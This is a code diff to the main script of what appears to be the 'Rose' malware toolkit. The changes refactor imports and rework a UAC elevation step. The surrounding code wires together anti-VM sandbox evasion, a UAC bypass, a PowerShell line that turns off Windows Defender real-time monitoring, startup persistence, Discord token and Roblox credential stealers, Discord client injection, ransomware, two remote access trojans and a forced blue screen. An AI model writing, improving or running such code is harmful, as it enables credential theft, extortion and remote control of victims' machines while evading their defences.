@@ -20,16 +20,16 @@ from PIL import ImageGrab
 
 # Header imports
 
-import bin.rose_rat
-import bin.InjectX
-import bin.knight_rat
-import bin.block_sites
-import bin.discordc
-import bin._roblox
-import bin.tbsod
-import bin.doggo_ransomware
-import bin.antivm
-import bin._startup as startup
+from bin import rose_rat
+from bin import InjectX
+from bin import knight_rat
+from bin import block_sites
+from bin import discordc
+from bin import _roblox
+from bin import tbsod
+from bin import doggo_ransomware
+from bin import antivm
+from bin import _startup as startup
 from bin.games import get_games
 from bin.config import Config
 from bin.webhook import _WebhookX
@@ -89,23 +89,23 @@ def send_error_notification(exception, type):
 
 if cc.get_antivm():
     try:
-        if bin.antivm.user_check():
+        if antivm.user_check():
             os._exit(1)
-        if bin.antivm.hwid_check():
+        if antivm.hwid_check():
             os._exit(1)
-        if bin.antivm.ip_check():
+        if antivm.ip_check():
             os._exit(1)
-        if bin.antivm.registry_check():
+        if antivm.registry_check():
             os._exit(1)
-        if bin.antivm.dll_check():
+        if antivm.dll_check():
             os._exit(1)
-        if bin.antivm.specs_check():
+        if antivm.specs_check():
             os._exit(1)
-        if bin.antivm.proc_check():
+        if antivm.proc_check():
             os._exit(1)
-        if bin.antivm.mac_check():
+        if antivm.mac_check():
             os._exit(1)
-        bin.antivm.process_check()
+        antivm.process_check()
     except Exception as e:
         send_error_notification(e, 'Rose Anti-VM')
 
@@ -115,9 +115,10 @@ if cc.get_uac_bypass():
             if GetSelf()[1]:
                 if UACbypass():
                     os._exit(1)
-                if not UACbypass():
-                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-                    os._exit(1)
+                else:
+                    param = " ".join(sys.argv)
+                    if ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, param, None, 1) > 32:
+                        os._exit(0)
     except Exception as e:
         send_error_notification(e, 'Rose UAC Bypass')
 
@@ -128,7 +129,7 @@ if IsAdmin():
             'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableRealtimeMonitoring" -Value 1',
             shell=True)
     if cc.get_block_sites():
-        bin.block_sites.block_sites()
+        block_sites.block_sites()
 
 if cc.get_start_up():
     try:
@@ -178,7 +179,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b""):
         return GetData(blob_out)
 
 Tokens = ""
-dclass = bin.discordc.DiscordX()
+dclass = discordc.DiscordX()
 
 def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"):
@@ -339,13 +340,13 @@ if cc.get_ipinf_stealing():
 
 if cc.get_injection():
     try:
-        bin.InjectX.InjectionX(webhook)
+        InjectX.InjectionX(webhook)
     except Exception as e:
         send_error_notification(e, 'Rose Discord Injection')
 
 if cc.get_roblox_stealing():
     try:
-        bin._roblox.RobloxX().run()
+        _roblox.RobloxX().run()
     except Exception as e:
         send_error_notification(e, 'Rose Roblox Stealer')
 
@@ -363,19 +364,19 @@ if os.path.exists(main_path):
 
 if cc.get_ransomware():
     try:
-        threading.Thread(target=bin.doggo_ransomware.ransomware()).start()
+        threading.Thread(target=doggo_ransomware.ransomware()).start()
     except Exception as e:
         send_error_notification(e, 'Doggo Ransomware')
 
 if cc.get_knight_discord_rat():
     try:
-        threading.Thread(target=bin.knight_rat.run_rat()).start()
+        threading.Thread(target=knight_rat.run_rat()).start()
     except Exception as e:
         send_error_notification(e, 'Knight Remote Access')
 
 if cc.get_rose_discord_rat():
     try:
-        threading.Thread(target=bin.rose_rat.run_rat()).start()
+        threading.Thread(target=rose_rat.run_rat()).start()
     except Exception as e:
         send_error_notification(e, 'Rose Remote Access')
 
@@ -391,7 +392,7 @@ if cc.get_bbcrash():
 
 if cc.get_tsbsod():
     try:
-        bin.tbsod.Trigger()
+        tbsod.Trigger()
     except Exception as e:
         send_error_notification(e, 'Rose Trigger BSOD')
 
